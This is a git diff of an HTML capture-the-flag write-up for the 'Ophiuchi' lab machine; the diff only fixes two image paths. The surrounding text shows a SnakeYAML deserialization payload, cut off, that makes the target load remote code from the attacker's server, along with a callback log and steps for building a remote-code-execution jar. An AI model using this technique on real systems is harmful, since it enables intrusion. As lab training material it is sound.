@@ -114,7 +114,7 @@ PORT     STATE SERVICE VERSION
 |_http-title: Parse YAML
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </code></pre><p>So we are going to see the HTTP port.
-<img src="../img/ophiuchi/img1.png" alt=""></p>
+<img src="../../img/ophiuchi/img1.png" alt=""></p>
 <p>So we see a YAML Parser, after few search on the web, we see that it is possible to get RCE with this functionnality. (<a href="https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858">https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858</a>)</p>
 <p>First, to confirm this, we could try this payload, and see if we can get a connection back :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml"><span style="color:#75715e">!!javax.script.ScriptEngineManager</span> [
@@ -128,7 +128,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 10.10.10.227 - - [04/Apr/2021 16:41:49] &quot;HEAD /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1&quot; 404 -
 </code></pre><p>Yes, we get a ping back, so we are on the right way.</p>
 <p>Now, we are gonna use this GitHub to get RCE (<a href="https://github.com/artsploit/yaml-payload)">https://github.com/artsploit/yaml-payload)</a>.</p>
-<p><img src="../img/ophiuchi/img2.png" alt=""></p>
+<p><img src="../../img/ophiuchi/img2.png" alt=""></p>
 <p>We need to alter <code>Runtime().exec(&quot; … &quot;);</code></p>
 <p>Compile with :</p>
 <pre><code>$javac src/artsploit/AwesomeScriptEngineFactory.java
